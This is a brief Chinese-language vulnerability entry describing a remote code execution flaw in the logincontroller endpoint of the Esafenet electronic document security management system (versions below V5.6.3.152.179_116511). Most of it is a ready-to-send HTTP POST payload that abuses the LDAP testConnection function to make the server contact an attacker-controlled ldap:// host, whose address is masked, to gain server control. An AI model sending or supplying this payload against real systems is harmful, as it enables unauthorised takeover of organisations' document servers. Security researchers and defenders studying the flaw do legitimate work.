**漏洞描述：**

亿赛通电子文档安全管理系统logincontroller接口存在远程代码执行漏洞，攻击者可利用该漏洞获取服务器权限。

**影响版本：**

亿赛通Version<V5.6.3.152.179_116511

**Payload：**

```php
POST /CDGServer3/logincontroller HTTP/1.1
Host:host
Content-Type: application/x-www-form-urlencoded
Connection: close
fromurl=/LdapAjax&token=1&command=testConnection&hosts=ldap://***.***.***.***:****/CN=account,OU=exp,DC=exp,DC=com&users=account&dns=CN=account,OU=exp,DC=exp,DC=com&dns2=OU=exp,DC=exp,DC=com&type=0&pwds=123456
```

---
